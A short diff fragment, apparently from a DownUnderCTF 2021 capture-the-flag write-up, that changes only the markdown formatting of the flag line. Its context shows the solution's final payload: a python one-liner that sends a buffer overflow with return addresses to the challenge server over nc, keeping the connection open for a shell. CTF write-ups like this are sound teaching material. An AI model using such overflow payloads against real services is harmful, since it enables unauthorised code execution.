@@ -16,4 +16,4 @@ Final payload:
 ```
 (python -c "print 'AAAABBBBCCCCDDDD\x00\x12\x40\x00\x00\x00\x00\x00\xfa\x11\x40\x00\x00\x00\x00\x00\xd7\x11\x40\x00\x00\x00\x00\x00'"; cat -) | nc pwn-2021.duc.tf 31921
 ```
-Flag: DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
+Flag: **DUCTF{https:\//www\.youtube\.com/watch?v=XfR9iY5y94s}**
